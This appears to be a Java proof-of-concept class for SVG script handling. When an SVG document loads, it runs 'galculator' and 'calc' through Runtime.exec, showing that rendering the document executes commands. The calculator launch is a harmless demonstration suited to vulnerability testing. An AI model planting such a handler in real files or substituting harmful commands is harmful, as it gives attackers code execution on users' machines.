import org.w3c.dom.events.EventListener;
import org.w3c.dom.svg.EventListenerInitializer;
import org.w3c.dom.svg.SVGDocument;
import org.w3c.dom.svg.SVGSVGElement;

import java.io.IOException;

public class SVGHandler implements EventListenerInitializer {

    public SVGHandler() {
    }

    public void initializeEventListeners(SVGDocument document) {
        SVGSVGElement root = document.getRootElement();
        EventListener listener = event -> {
            exec("galculator");
            exec("calc");
        };
        root.addEventListener("SVGLoad", listener, false);
    }

    private static void exec(String s) {
        try {
            Runtime.getRuntime().exec(s);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

